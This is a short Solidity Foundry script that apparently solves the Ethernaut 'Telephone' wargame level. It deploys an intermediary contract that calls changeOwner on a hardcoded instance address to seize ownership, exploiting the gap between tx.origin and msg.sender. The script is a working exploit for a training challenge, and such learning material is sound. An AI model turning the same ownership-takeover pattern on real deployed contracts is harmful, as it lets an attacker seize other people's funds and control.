// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Script, console} from "forge-std/Script.sol";
import {Telephone} from "../../src/Ethernaut/Telephone.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Ringring callTelephone = new Ringring();
        callTelephone.ring(0xF63A905EDc5d807724044B9489209f419275e852);
        vm.stopBroadcast();
    }
}

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Ringring {
    ITelephone public telephone = ITelephone(0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446);

    function ring(address _attacker) public {
        telephone.changeOwner(_attacker);
    }
}
